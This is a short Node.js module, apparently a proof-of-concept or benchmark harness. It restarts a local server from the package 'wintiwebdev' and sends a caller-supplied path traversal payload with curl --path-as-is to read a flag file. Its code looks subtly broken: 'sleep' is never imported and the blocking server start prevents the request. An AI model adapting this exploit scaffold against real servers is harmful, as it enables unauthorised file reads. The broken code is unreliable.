function exploitFunction(payload) {
  const { execSync } = require("child_process");
  const path = require("path");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  // Stop any running server on port 8000
  execSync("fuser -k 8000/tcp", { stdio: 'inherit' });

  // Start the server
  execSync("node ./node_modules/wintiwebdev/app.js", { stdio: 'inherit' });

  // Sleep for 2 seconds to ensure the server starts
  sleep.sleep(2);

  // Send the attack string
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8000${payload}"`;
  const { exec } = require("child_process");
  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error: ${error}`);
      process.exit(1);
    }
    return stdout;
  });
}

module.exports = { exploitFunction };